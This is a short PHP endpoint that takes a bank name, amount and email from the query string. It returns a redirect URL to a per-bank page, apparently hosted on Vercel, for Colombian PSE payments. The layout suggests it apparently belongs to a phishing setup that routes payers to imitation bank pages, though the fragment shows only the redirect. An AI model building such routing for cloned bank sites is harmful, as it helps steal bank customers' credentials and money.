<?php
header('Content-Type: application/json');
require_once __DIR__ . '/config.php';

$banco = $_GET['banco'] ?? '';
$monto = intval($_GET['monto'] ?? 0);
$email = $_GET['email'] ?? '';

// Bancos con vercel (implementados anteriormente)
if (isset($PSE_BANKS[$banco])) {
    $b = $PSE_BANKS[$banco];
    echo json_encode(['url' => PSE_BASE . '/sites/' . $b['slug'] . '/manager/' . $b['id'], 'delay' => 2000]);
    exit;
}


echo json_encode(['url' => null, 'delay' => 2000]);
